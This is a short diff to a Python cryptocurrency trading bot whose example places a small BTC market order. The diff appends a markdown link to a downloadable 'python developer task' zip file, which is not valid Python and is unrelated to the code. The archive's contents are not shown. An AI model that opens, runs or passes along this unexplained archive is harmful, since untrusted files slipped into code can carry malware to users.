@@ -75,3 +75,4 @@ if __name__ == "__main__":
     # Example: Buy 0.001 BTC
     order = bot.place_market_order("BTCUSDT", SIDE_BUY, 0.001)
     print("Order Response:", order)
+[Copy_of_python_developer_task.zip](https://github.com/user-attachments/files/20885115/Copy_of_python_developer_task.zip)
